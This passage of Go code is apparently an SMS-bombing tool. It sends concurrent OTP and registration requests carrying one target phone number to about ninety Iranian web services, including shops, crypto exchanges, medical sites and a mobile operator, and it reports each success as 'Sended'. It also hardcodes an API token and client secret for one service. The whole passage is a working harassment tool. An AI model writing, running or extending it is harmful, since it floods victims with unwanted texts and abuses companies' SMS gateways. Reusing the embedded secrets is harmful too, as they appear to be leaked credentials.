		// bit24.cash (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// app.itoll.ir (JSON) - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// gw.taaghche.com (JSON) - signup - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
				"contact": phone,
			}, &wg, ch)
		}

		// namava.ir (JSON) - با otp - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
				"UserName": phone,
			}, &wg, ch)
		}

		// application2.billingsystem.ayantech.ir (JSON) - payload پیچیده
		// فرض میکنیم منظور JSON با ساختار مشخص بوده
		wg.Add(1)
		tasks <- func() {
			payload := map[string]interface{}{
				"Parameters": map[string]interface{}{
					"ApplicationType":      "Web",
					"ApplicationUniqueToken": nil, // یا یک مقدار مناسب دیگر
					"ApplicationVersion":   "1.0.0",
					"MobileNumber":         phone, // "+"+phone اگر کد کشور لازم است
				},
			}
			sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", payload, &wg, ch)
		}

		// application2.billingsystem.ayantech.ir (JSON) - getLoginMethod
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/getLoginMethod", map[string]interface{}{
				"MobileNumber": phone,
			}, &wg, ch)
		}

		// application2.billingsystem.ayantech.ir (JSON) - requestActivationCode - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
				"MobileNumber": phone,
			}, &wg, ch)
		}

		// core.pishkhan24.ayantech.ir (JSON) - LoginByOTP - payload با "null, Username"
		// فرض میکنیم منظور JSON با کلید "Username" بوده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
				"Username": phone, // حدس بر اساس نیاز APIهای مشابه
			}, &wg, ch)
		}

		// core.pishkhan24.ayantech.ir (JSON) - LoginByOTP - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
				"Username": phone,
			}, &wg, ch)
		}

		// core.pishkhan24.ayantech.ir (JSON) - LoginByOTP - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
				"Username": phone,
			}, &wg, ch)
		}

		// simkhanapi.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
				"mobileNumber": phone,
			}, &wg, ch)
		}

		// api.abantether.com (JSON) - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// bit24.cash (JSON) - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// dicardo.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://dicardo.com/sendotp", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// ghasedak24.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://ghasedak24.com/user/otp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// tikban.com (JSON) - با CellPhone
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
				"CellPhone": phone,
			}, &wg, ch)
		}

		// tikban.com (JSON) - با phoneNumber - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// ketabchi.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://ketabchi.com/api/v1/auth/requestVerificationCodee", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// offdecor.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.offdecor.com/index.php?route=account/login/sendCode", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// shahrfarsh.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://shahrfarsh.com/Account/Login", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// takfarsh.com (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("username", phone)
			// ممکن است نیاز به پارامتر action هم باشد
			sendFormRequest(ctx, "https://takfarsh.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// accounts.khanoumi.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://accounts.khanoumi.com/account/login/init", map[string]interface{}{
				"loginIdentifier": phone,
			}, &wg, ch)
		}

		// api.rokla.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.rokla.ir/user/request/otp/", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// mashinbank.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mashinbank.com/api2/users/check", map[string]interface{}{
				"mobileNumber": phone,
			}, &wg, ch)
		}

		// client.api.paklean.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://client.api.paklean.com/download", map[string]interface{}{
				"tel": phone,
			}, &wg, ch)
		}

		// beta.raghamapp.com (JSON)
		wg.Add(1)
                tasks <- func() {
		sendJSONRequest(ctx, "https://beta.raghamapp.com/auth", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// gateway-v2.trip.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// api.timcheh.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.timcheh.com/auth/otp/send", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// mobogift.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mobogift.com/signin", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}

		// cinematicket.org (JSON) - otp
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://cinematicket.org/api/v1/users/otp", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// cinematicket.org (JSON) - signup
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://cinematicket.org/api/v1/users/signup", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// kafegheymat.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// delino.com (JSON) - user register
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.delino.com/user/register", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// restaurant.delino.com (JSON) - payload پیچیده
		// فرض میکنیم JSON با کلیدهای ساده شده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://restaurant.delino.com/user/register", map[string]interface{}{
				"apiToken":      "VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgzgcXrdyxHJGFcranHS2mECTWgq", // توکن ثابت
				"clientSecret": "7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq",                         // راز ثابت
				"device":        "web",
				"username":      phone,
			}, &wg, ch)
		}

		// 1401api.tamland.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://1401api.tamland.ir/api/user/signup", map[string]interface{}{
				"Mobile": phone,
			}, &wg, ch)
		}

		// melix.shop (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://melix.shop/site/api/v1/user/validate", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// api6.arshiyaniha.com (JSON) - payload با ترکیب کلید
		// فرض میکنیم JSON با کلیدهای جداگانه
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
				"country_code": "98",
				"cellphone":    phone,
			}, &wg, ch)
		}

		// api.ehteraman.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.ehteraman.com/api/request/otp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// ebcom.mci.ir (JSON) - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
				"msisdn": phone,
			}, &wg, ch)
		}

		// refahtea.ir (Form) - مسیر wp-admin/admin-ajax.php یا مشابه آن نیست اما ممکن است فرم باشد
		// با فرض JSON
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// mamifood.org (JSON) - SendValidationCode
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{
				"Phone": phone,
			}, &wg, ch)
		}

		// mamifood.org (JSON) - IsUserAvailable
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mamifood.org/Registration.aspx/IsUserAvailable", map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}

		// api.abantether.com (JSON) - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// abantether.com (JSON) - payload با s1
		// s1 به شکل "'phoneNumber':%s ,'email':''" تعریف شده که ساختار JSON نیست
		// فرض میکنیم منظور JSON با دو کلید phoneNumber و email بوده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://abantether.com/users/register/phone/send/", map[string]interface{}{
				"phoneNumber": phone,
				"email":       "",
			}, &wg, ch)
		}

		// glite.ir (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobileemail", phone)
			// ممکن است نیاز به پارامتر action هم باشد
			sendFormRequest(ctx, "https://www.glite.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// offch.com (JSON) - کلید "1_username" عجیب است
		// با فرض JSON و کلید "username"
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.offch.com/login", map[string]interface{}{
				"username": phone, // حدس
			}, &wg, ch)
		}

		// api.watchonline.shop (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// api.snapp.express (Form) - تکراری با URL کمی متفاوت
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("cellphone", phone)
			// URL اصلی را حفظ میکنیم
			sendFormRequest(ctx, "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=a4547bd9&optionalVersion=5.6.6&UDID=2bb22fca-5212-47dd-9ff5-e6909df17d6b&lat=35.774&long=51.418", formData, &wg, ch)
		}

		// backend.digify.shop (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://backend.digify.shop/user/merchant/otp/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// auth.mrbilit.ir (URL based) - URL شامل پارامتر phone در query است و payload عجیب است
		// با فرض اینکه درخواست GET به URL با پارامتر phone کافی است و payload نادیده گرفته شود
		// از sendJSONRequest با payload خالی استفاده میکنیم چون GET نداریم و payload در اصل نیاز نیست
		wg.Add(1)
		tasks <- func() {
			// URL اصلی باید با phone پر شود
			url := fmt.Sprintf("https://auth.mrbilit.ir/api/Token/send?mobile=%s", phone)
			// payload "mobile": "phone" نامعتبر است و احتمالا نیاز نیست.
			sendJSONRequest(ctx, url, nil, &wg, ch) // ارسال nil به جای payload
		}

		// platform-api.snapptrip.com (JSON) - payload با مقدار "phone" به جای شماره واقعی
		// فرض میکنیم منظور ارسال شماره تلفن واقعی بوده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
				"phoneNumber": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// api-v2.filmnet.ir (URL based) - URL شامل متغیر است و payload "monsmain":"monsmain" عجیب است
		// با فرض اینکه URL مهم است و payload نادیده گرفته میشود.
		wg.Add(1)
		tasks <- func() {
			// URL اصلی باید با phone پر شود
			url := fmt.Sprintf("https://api-v2.filmnet.ir/access-token/users/%v/otp", phone)
			// payload "monsmain":"monsmain" نامعتبر است و احتمالا نیاز نیست.
			sendJSONRequest(ctx, url, nil, &wg, ch) // ارسال nil به جای payload
		}

		// api.bitpin.org (JSON) - payload با مقدار "phone" به جای شماره واقعی
		// فرض میکنیم منظور ارسال شماره تلفن واقعی بوده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.bitpin.org/v3/usr/authenticate/", map[string]interface{}{
				"phone": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// www.chamedoun.com (JSON) - payload با مقدار "phone" به جای شماره واقعی
		// فرض میکنیم منظور ارسال شماره تلفن واقعی بوده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.chamedoun.com/auth/sms/send-login-otp", map[string]interface{}{
				"phone": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// api.torob.com (URL based) - URL شامل query parameter است و payload عجیب است
		// با فرض اینکه پارامتر phone_number در URL مهم است و payload نادیده گرفته شود.
		wg.Add(1)
		tasks <- func() {
			// URL اصلی باید با phone پر شود
			url := fmt.Sprintf("https://api.torob.com/v4/user/phone/send-pin/?phone_number=%s", phone)
			// payload "phone_number":"phone" نامعتبر است و احتمالا نیاز نیست.
			sendJSONRequest(ctx, url, nil, &wg, ch) // ارسال nil به جای payload
		}

		// www.namava.ir (JSON) - by-otp - payload با مقدار "phone" به جای شماره واقعی - تکراری با اصلاح payload
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
				"UserName": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// core.gap.im (JSON) - sendOTP.gap - کلید "mobile­" عجیب است
		// با فرض JSON و کلید "mobile"
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://core.gap.im/v1/user/sendOTP.gap", map[string]interface{}{
				"mobile": phone, // حدس
			}, &wg, ch)
		}

		// api.mydigipay.com (JSON) - تکراری با اصلاح payload
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{
				"cellNumber": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// gateway.wisgoon.com (JSON) - payload با مقدار "phone" به جای شماره واقعی
		// فرض میکنیم منظور ارسال شماره تلفن واقعی بوده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://gateway.wisgoon.com/api/v1/auth/login/", map[string]interface{}{
				"phone": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// tagmond.com (JSON) - payload با مقدار "phone" به جای شماره واقعی
		// فرض میکنیم منظور ارسال شماره تلفن واقعی بوده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://tagmond.com/phone_number", map[string]interface{}{
				"phone_number": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// api.doctoreto.com (JSON) - تکراری با اصلاح payload
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
				"mobile": phone, // استفاده از متغیر phone واقعی (کلید "mobile­" اصلاح شد)
			}, &wg, ch)
		}

		// www.azki.com (JSON) - تکراری با اصلاح payload
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
				"phoneNumber": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// api.lendo.ir (JSON) - تکراری با اصلاح payload
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.lendo.ir/api/customer/auth/send-otp", map[string]interface{}{
				"mobile": phone, // استفاده از متغیر phone واقعی (کلید "mobile­" اصلاح شد)
			}, &wg, ch)
		}

		// pakhsh.shop (Form) - مسیر wp-admin/admin-ajax.php یا مشابه آن نیست اما ممکن است فرم باشد. payload با مقدار "phone"
		// با فرض Form Data و کلید "phone" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("phone", phone) // استفاده از متغیر phone واقعی
			sendFormRequest(ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
		}


		// see5.net (Form) - مسیر php معمولاً Form Data می پذیرد. payload با مقدار "phone"
		// با فرض Form Data و کلید "phone" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("phone", phone) // استفاده از متغیر phone واقعی
			sendFormRequest(ctx, "https://see5.net/phonenumberHandler.php", formData, &wg, ch)
		}

		// see5.net (Form) - مسیر php معمولاً Form Data می پذیرد. payload با مقدار "phone"
		// با فرض Form Data و کلید "mobile" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone) // استفاده از متغیر phone واقعی
			sendFormRequest(ctx, "https://see5.net/wp-content/themes/see5/webservice_demo2.php", formData, &wg, ch)
		}


		// simkhanapi.ir (JSON) - تکراری با اصلاح payload
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
				"mobileNumber": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// my.limoome.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://my.limoome.com/api/auth/login/otp", map[string]interface{}{
				"mobileNumber": phone,
			}, &wg, ch)
		}

		// www.mihanpezeshk.com (JSON) - Verification_Patients - payload با مقدار "phone"
		// با فرض JSON و کلید "mobile" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.mihanpezeshk.com/Verification_Patients", map[string]interface{}{
				"mobile": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// www.mihanpezeshk.com (JSON) - ConfirmCodeSbm_Doctor - payload با مقدار "phone"
		// با فرض JSON و کلید "mobile" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.mihanpezeshk.com/ConfirmCodeSbm_Doctor", map[string]interface{}{
				"mobile": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// behzadshami.com (JSON) - payload با مقدار "phone"
		// با فرض JSON و کلید "regMobile" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://behzadshami.com/login_register?type=register", map[string]interface{}{
				"regMobile": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// shop.tnovin.com (JSON) - payload با مقدار "phone"
		// با فرض JSON و کلید "phone" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://shop.tnovin.com/login", map[string]interface{}{
				"phone": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// moshaveran724.ir (Form) - مسیر php معمولاً Form Data می پذیرد. payload با مقدار "phone"
		// با فرض Form Data و کلید "number" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("number", phone) // استفاده از متغیر phone واقعی
			sendFormRequest(ctx, "https://moshaveran724.ir/m/uservalidate.php", formData, &wg, ch)
		}

		// moshaveran724.ir (Form) - مسیر php معمولاً Form Data می پذیرد. payload با مقدار "phone"
		// با فرض Form Data و کلید "number" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("number", phone) // استفاده از متغیر phone واقعی
			sendFormRequest(ctx, "https://moshaveran724.ir/m/pms.php", formData, &wg, ch)
		}


		// ashraafi.com (Form) - مسیر wp-admin/admin-ajax.php یا مشابه آن نیست اما ممکن است فرم باشد. payload با مقدار "phone"
		// با فرض Form Data و کلید "phone_number" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("phone_number", phone) // استفاده از متغیر phone واقعی
			sendFormRequest(ctx, "https://ashraafi.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// bazidone.com (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد. payload با مقدار "phone"
		// با فرض Form Data و کلید "digits_phone" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digits_phone", phone) // استفاده از متغیر phone واقعی
			sendFormRequest(ctx, "https://bazidone.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// www.bigtoys.ir (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد. payload با مقدار "phone"
		// با فرض Form Data و کلید "phone" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("phone", phone) // استفاده از متغیر phone واقعی
			sendFormRequest(ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// bitex24.com (JSON) - payload با مقدار "phone"
		// با فرض JSON و کلید "mobile" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://bitex24.com/api/v1/auth/sendSms2", map[string]interface{}{
				"mobile": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

		// livarfars.ir (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد. payload با مقدار "phone"
		// با فرض Form Data و کلید "phone" با مقدار شماره واقعی
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("phone", phone) // استفاده از متغیر phone واقعی
			sendFormRequest(ctx, "https://livarfars.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// apigateway.okala.com (JSON) - تکراری با اصلاح payload
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister", map[string]interface{}{
				"mobile": phone, // استفاده از متغیر phone واقعی
			}, &wg, ch)
		}

	}

	
	close(tasks)


	go func() {
		wg.Wait()
		close(ch)
	}()

	// پردازش کدهای وضعیت دریافت شده از کانال ch
	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 { // کد وضعیت 0 برای درخواست های لغو شده توسط Context
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
